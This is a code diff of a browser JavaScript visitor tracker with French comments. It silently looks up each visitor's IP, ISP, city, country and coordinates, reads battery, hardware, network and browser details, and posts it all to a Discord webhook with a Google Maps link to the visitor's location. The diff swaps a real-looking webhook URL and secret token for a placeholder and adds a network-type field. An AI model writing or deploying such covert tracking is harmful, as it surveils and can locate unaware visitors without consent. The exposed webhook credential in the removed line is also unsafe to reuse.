@@ -1,6 +1,6 @@
 // --- CONFIGURATION ---
-// ⚠️ Vérifie bien que tu as mis ta VRAIE URL Discord ici !
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1465691104006377618/IGLkGAilsG__jfx7Zr4PQivN4b8t6n006yEPF6qWwdICP95vu-7TJ54ax6w7muQhKuDA";
+// ⚠️ REMPLACE CECI PAR TA VRAIE URL DISCORD !
+const WEBHOOK_URL = "https://discord.com/api/webhooks/TA_SUITE_DE_CHIFFRES/TA_CLE_SECRETE";
 
 // --- FONCTIONS UTILITAIRES ---
 function getBrowser() {
@@ -18,6 +18,7 @@ function getHardwareInfo() {
     return `CPU: ${cores} Cœurs | RAM: ${ram}`;
 }
 
+// Fonction pour récupérer la 4G/Wifi (Marche surtout sur Chrome/Edge/Android)
 function getConnectionInfo() {
     const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     return conn ? `${conn.effectiveType.toUpperCase()} (${conn.rtt}ms)` : "Non détecté";
@@ -36,8 +37,7 @@ async function getBatteryInfo() {
 
 // --- FONCTION PRINCIPALE ---
 async function sendVisitorLog() {
-    // ❌ J'ai commenté l'anti-spam pour tes tests.
-    // Décommente la ligne ci-dessous quand tu as fini tes tests !
+    // ❌ Anti-spam désactivé pour tes tests (réactive-le plus tard si tu veux)
     // if (sessionStorage.getItem("visited")) return;
 
     console.log("🚀 Démarrage du tracker...");
@@ -47,11 +47,10 @@ async function sendVisitorLog() {
         const response = await fetch("https://ipwho.is/");
         if (!response.ok) throw new Error("Erreur API IP");
         const data = await response.json();
-        console.log("📍 IP trouvée :", data.ip);
-
+        
         // 2. Données techniques
         const battery = await getBatteryInfo();
-        const connection = getConnectionInfo();
+        const connection = getConnectionInfo(); // On récupère l'info ici
         const hardware = getHardwareInfo();
         const browser = getBrowser();
 
@@ -70,10 +69,13 @@ async function sendVisitorLog() {
                     { name: "🏢 FAI", value: data.connection.isp || "Inconnu", inline: false },
                     { name: "📍 Localisation", value: `${data.city} (${data.country})`, inline: true },
                     { name: "📡 IP", value: data.ip, inline: true },
+                    
+                    // --- AJOUT DE L'INFO RÉSEAU ICI ---
+                    { name: "📶 Réseau", value: connection, inline: true },
+                    
                     { name: "🔋 Batterie", value: battery, inline: true },
                     { name: "💻 Matériel", value: hardware, inline: true },
                     { name: "🌐 Navigateur", value: browser, inline: true },
-                    // Lien Google Maps corrigé
                     { name: "🗺️ Carte", value: `[Voir sur Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})`, inline: false }
                 ],
                 footer: { text: new Date().toLocaleString() }
@@ -89,8 +91,7 @@ async function sendVisitorLog() {
 
         if (discordResponse.ok) {
             console.log("✅ Notification Discord envoyée !");
-            // Active cette ligne plus tard pour éviter le spam :
-            // sessionStorage.setItem("visited", "true");
+            // sessionStorage.setItem("visited", "true"); // À décommenter plus tard
         } else {
             console.error("❌ Erreur Discord :", discordResponse.status);
         }
